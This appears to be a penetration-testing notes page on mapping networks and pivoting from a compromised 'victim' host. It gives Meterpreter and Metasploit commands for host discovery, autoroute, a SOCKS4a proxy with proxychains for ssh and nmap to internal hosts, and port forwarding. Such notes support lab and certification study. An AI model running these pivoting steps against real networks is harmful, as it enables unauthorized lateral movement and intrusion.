# n - Mapping a Network

How to discover other subnets/networks from a compromised Victim host PC.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# in our Meterpreter session, we can be able to map/discover other subnets on the network.
meterpreter > ifconfig # view victim network adaptors.
meterpreter > shell # open cmd prompt to view more network info.
cmd> ipconfig /all # also check the the dns ip, it may be another subnet.

meterpreter > arp # view arp table of victim.
meterpreter > route # routing table of victim.
cmd> ipconfig /displaydns # view all the dns entries for domain names and subnets.
cmd> netstat ? # display help menu.
cmd> netstat -ano # view all active TCP connections on victim.

# some active techniques to discover more host.
# 1
msf > use post/multi/gather/ping_sweep
msf > set SESSION 1
msf > set RHOSTS $victim_ip_subnet # eg: 192.168.10.0/24
# or
# 2
meterpreter > run arp_scanner -h # view help menu.
meterpreter > run arp_scanner -r $victim_ip_subnet # eg: 192.168.10.0/24.
```
{% endcode %}

### Investigating Discovered Hosts

{% code overflow="wrap" lineNumbers="true" %}
```bash
# After discovering other hosts from the compromised victim pc, its time to investigate the discovered hosts. One way to do this is to do a Port Scan. But we are not able to run nmap, in order to bypass this issue we can use the exploited Victim as a bridge and and forward all the packets through it, ie, the Victim will work as a proxy between us and the remote network.

# ------------------------------ adding a route to the remote network.
# 1
msf > route add 10.10.10.0 255.255.255.0 2 # add 10.10.10.0/24 subnet through the meterpreter session 2.
# or 
# 2
meterpreter > run autoroute -s 10.10.10.0/24 # adds the route via the current meterpreter session.
meterpreter > run autoroute -p # view the routing table.
# or 
# 3
msf > use post/windows/manage/autoroute
msf > set SESSION, SUBNET, then run # successfully added the route, meaning the traffic will pass through the Victim to the remote hosts.
msf > route print # display all added routes.

# remove or flush routes.
msf > route flush
msf > run # removes/clear all added routes.

# ------------------------------ scanning ports on the Remote network.
# after adding route to the remote network, we can start scanning ports of each discovered host in the remote network.
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS, PORTS then run.

# after scanning all the remote hosts, we have to tweak our Pivoting configuration in order to use external tools through the meterpreter session, this will allow us to run tools like nmap, ssh, telnet, ftp, web browser etc, via the session on the exploited machine. 


# ----------------------------1---------------------------------
#What we have to do is to setup the target as proxy and forward all the traffic through "socks4".
msf > use auxiliary/server/socks4a
msf > run

root@kali: netstat -tulpn | grep 1080 # check if the socks4a is listening in background with the SRVHOST and SRVPORT you selected.

# The module creates socks4 proxy that uses the routing table set in metasploit, ie all the traffic that goes through the proxy will use the routes added in metasploit (in line 5 above).
# Once the proxy is runnign we have to use tools like Proxy chain or Redsocks to redirect all the traffic through the proxy.

# using Proxy Chain
# in kali, we edit the proxy chain config file.
sudo nano /etc/proxychains4.conf # scroll to end of the line, make sure same port is set with the metasploit (auxiliary/server/socks4a) module, save and exit. In ither words, we are instructing proxychains to use the proxy set with Metasploit and its routes.

# Now we want to establish a SSH connection with one of the remote host.
proxychains4 ssh root@$remote_ip # access the remote victim pc via SSH through proxychains.
# if we want to open firefox, just prepend firefox with proxychains4
proxychains4 firefox # launch firefox.
# we can also do an nmap scan on the remote ip.
proxychains4 nmap -sS -Pn -n $ip --top-ports 50

# Note: you can use ProxyChains4 or ProxyChains.

# when you are done, You can kill the socks4 proxy in metasploit with:
msf > jobs -K # stops all jobs.
msf > route flussh # clear all routes.

# -----------------------------2---------------------------------
# Another way to access a remote host is using the Port Forwarding option.
meterpreter > portfwd -h # help menu.
meterpreter > portfwd add -l 8080 -p 80 -r $remote_hostIP # this listens on our kali local port 8080 and forward all traffic received to the remote host port 80, now we should be able to access the remote host port 80 through our browser.

root@kali: netstat -tulpn | grep 8080 # check if the 8080 is listening.
127.0.0.1:8080 # enter in browser.
```
{% endcode %}

